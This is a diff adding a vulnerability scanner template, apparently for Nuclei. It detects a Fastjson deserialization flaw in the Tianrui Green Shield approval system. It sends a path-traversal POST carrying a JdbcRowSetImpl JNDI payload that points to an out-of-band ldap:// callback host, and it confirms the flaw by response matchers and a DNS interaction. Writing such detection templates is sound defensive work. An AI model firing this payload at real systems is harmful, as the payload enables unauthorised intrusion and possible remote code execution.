@@ -1,0 +1,45 @@
+id: poc-yaml-tipray-gsas-findtrusteebyfilter-fastjson-deserialization
+info:
+  name: Tianrui Green Shield Approval System findTrusteeByFilter Fastjson Deserialization Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: deserialization,dnslog
+
+variables:
+  random: "{{rand_text_alphanumeric(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /trwfe/login.jsp/.%2e/rest/ext/findTrusteeByFilter HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+            "@type": "com.sun.rowset.JdbcRowSetImpl",
+            "dataSourceName": "ldap://{{interactsh-url}}/{{random}}",
+            "autoCommit": true
+        }
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "set property error"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
